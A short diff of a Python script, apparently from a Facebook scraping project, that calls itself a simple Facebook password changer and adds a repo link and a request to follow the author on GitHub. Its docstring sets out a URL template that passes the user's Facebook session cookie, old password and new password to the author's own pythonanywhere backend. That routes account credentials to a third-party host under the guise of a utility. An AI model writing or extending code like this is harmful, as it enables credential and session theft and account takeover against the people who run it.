@@ -1,6 +1,8 @@
 #simple password changer of Facebook with my backend website api
 '''https://xerxxd.pythonanywhere.com//XERXXD/cred?cookie={cokkie}&oldpwd={old_pwd}&newpwd={new_pwd}'''
 videolink = 'https://youtu.be/Unv9uZ8REGY'
+repo = 'https://github.com/XERX-XD/fb_scrap/blob/main/pass.py'
+'''dont forget to follow me on GitHub '''
 import os
 import requests
 def logo():
